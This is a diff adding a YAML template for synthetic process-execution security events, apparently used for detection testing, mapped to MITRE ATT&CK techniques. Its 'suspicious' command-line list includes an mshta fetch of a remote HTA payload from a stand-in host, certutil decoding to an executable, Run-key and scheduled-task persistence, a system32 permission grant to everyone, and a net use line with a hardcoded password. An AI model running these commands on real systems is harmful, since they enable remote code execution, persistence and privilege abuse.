@@ -1,0 +1,113 @@
+# ============================================================================
+# Process Execution Event Template
+# ============================================================================
+# Covers: process creation, child process spawning, command execution
+# MITRE ATT&CK: T1059 (Command and Scripting Interpreter),
+#               T1106 (Native API), T1204 (User Execution)
+# ============================================================================
+
+event_category: process
+
+subtypes:
+  create:
+    event_action: process_started
+    event_outcome: success
+
+  terminate:
+    event_action: process_stopped
+    event_outcome: success
+
+  inject:
+    event_action: process_injection
+    event_outcome: success
+
+# Common process names (Windows)
+windows_processes:
+  parent:
+    - explorer.exe
+    - winlogon.exe
+    - services.exe
+    - svchost.exe
+    - taskmgr.exe
+    - powershell.exe
+    - cmd.exe
+    - mmc.exe
+
+  child:
+    - cmd.exe
+    - powershell.exe
+    - wscript.exe
+    - cscript.exe
+    - mshta.exe
+    - rundll32.exe
+    - regsvr32.exe
+    - msiexec.exe
+    - net.exe
+    - netstat.exe
+    - whoami.exe
+    - ipconfig.exe
+    - ping.exe
+    - nltest.exe
+    - mimikatz.exe
+    - psexec.exe
+    - wmic.exe
+    - certutil.exe
+    - bitsadmin.exe
+
+# Common process names (Linux)
+linux_processes:
+  parent:
+    - bash
+    - sh
+    - systemd
+    - cron
+    - sshd
+    - python3
+    - nginx
+    - apache2
+
+  child:
+    - bash
+    - sh
+    - python3
+    - curl
+    - wget
+    - nc
+    - ncat
+    - nmap
+    - chmod
+    - chown
+    - sudo
+    - su
+    - crontab
+    - at
+
+# Command line patterns (realistic examples)
+command_lines:
+  benign:
+    - "cmd.exe /c ipconfig /all"
+    - "powershell.exe -Command Get-Process"
+    - "net.exe user"
+    - "whoami.exe"
+    - "ping.exe -n 4 8.8.8.8"
+    - "certutil.exe -hashfile C:\\file.txt SHA256"
+    - "wmic.exe process list brief"
+
+  suspicious:
+    - "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand"
+    - "cmd.exe /c echo Y | cacls C:\\Windows\\system32 /t /e /g everyone:F"
+    - "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\""
+    - "mshta.exe http://malicious.example/payload.hta"
+    - "certutil.exe -decode C:\\Windows\\Temp\\encoded.txt C:\\Windows\\Temp\\decoded.exe"
+    - "wmic.exe /node:WORKSTATION process call create cmd.exe"
+    - "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d C:\\malware.exe"
+    - "schtasks.exe /create /tn persistence /tr C:\\malware.exe /sc onlogon"
+    - "net.exe use \\\\DC01\\C$ /user:CORP\\admin Password123"
+    - "nltest.exe /dclist:corp.local"
+
+# Integrity levels (Windows)
+integrity_levels:
+  - Low
+  - Medium
+  - High
+  - System
